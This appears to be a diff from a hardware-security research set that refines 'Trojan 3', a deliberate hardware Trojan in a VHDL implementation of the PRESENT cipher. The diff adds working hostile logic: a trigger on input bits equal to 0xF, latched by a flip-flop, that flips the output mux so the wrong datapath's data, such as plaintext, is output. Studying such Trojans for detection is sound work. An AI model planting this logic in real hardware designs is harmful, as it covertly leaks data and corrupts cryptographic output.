@@ -2,9 +2,8 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 3: trigger = specific pattern for the 4 Least Significant bits of the input data
--- payload = invert the output mux select signal, causing the data of the incorrect/unselected
--- datapath to appear on the output data bus
+-- Trojan 3: trigger = Specific bit pattern (1111 = 0xF) of the Least Significant bits of the input data
+-- payload = write the output data of the incorrect/unselected datapath(NOT mode_sel(0)) onto the output data bus
 
 entity present_Trojan3 is
         port (
@@ -24,7 +23,7 @@ architecture rtl of present_Trojan3 is
         signal  key_sched_out,
                 key_mem_out : std_logic_vector(63 downto 0);
 
-        signal  current_round,
+         signal current_round,
                 mem_address : std_logic_vector(4 downto 0);
 
         signal  enc_ena,
@@ -110,33 +109,36 @@ begin
                         plaintext  => plaintext
                 );
         
-        -- The Trojan gets triggered when the 4 Least Significant bits of the
-        -- input data are '1111', i.e. 0xF -> triggering probability 2^(-63)
+        -- trigger when the LSBits of the input data are all ones
         trojan_trig <= '1' when data_in(3 downto 0) = x"F" else '0';
         
-        -- Payload : invert the output mux select signal and thus cause the 
-        -- wrong data to appear on the output data bus
-        trojan_xor : entity work.xor_2
-               port map(
-                        a => trojan_trig,
-                        b => dec_ena,
-                        y => trojan_mux_sel
-               );
-
-        -- need a flip-flop to store the trojan-tampered signal, since
-        -- in normal operation the input data will change before entering DONE state
+        -- need a flip-flop to store the **trojan's state** (i.e. trigger condition satisfied or not),
+        -- since during normal operation the input data will change before entering DONE state
         -- (i.e. when the round counter is equal to 31 for encryption and 0 for decryption).
-        -- The new data might not fulfill the Trojan triggering condition, which will cause
-        -- the deactivation of the Trojan before its payload is executed.
-        -- Thus the output data of the correct datapath will be placed on the output data bus.
+        -- The new data might not satisfy the Trojan triggering condition, which will cause
+        -- the deactivation of the Trojan before its payload is executed, thus the correct datapath's data 
+        -- will be written onto the output data bus.
+        -- We use the load_ena signal as the trojan FF enable signal, since this signal goes high only when
+        -- in DONE state (and after leaving KEY_GEN state).
+        -- This way the trojan will "remember" its state until a crypto operation is DONE, and not change
+        -- during an encryption/decryption due to a change on the data input bus.
         trojan_ff : entity work.dflip_flop
                 port map(
                         clk => clk,
-                        ena => ena,
+                        ena => load_ena,
                         rst => rst,
-                        d => trojan_mux_sel,
+                        d => trojan_trig,               -- store current trojan status
                         q => trojan_ff_out
                 );
+        
+        -- trojan payload XOR gate to invert the output multiplexer's select signal, in order for the
+        -- unselected datapath's output data to be written on the data_out bus.
+        trojan_xor : entity work.xor_2
+               port map(
+                        a => trojan_ff_out,
+                        b => dec_ena,
+                        y => trojan_mux_sel
+               );
 
         -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
         -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
@@ -148,7 +150,7 @@ begin
                 port map(
                         input_A => ciphertext,
                         input_B => plaintext,
-                        sel     => trojan_ff_out,                        
+                        sel     => trojan_mux_sel,                        
                         mux_out => mux_out
                 );
 
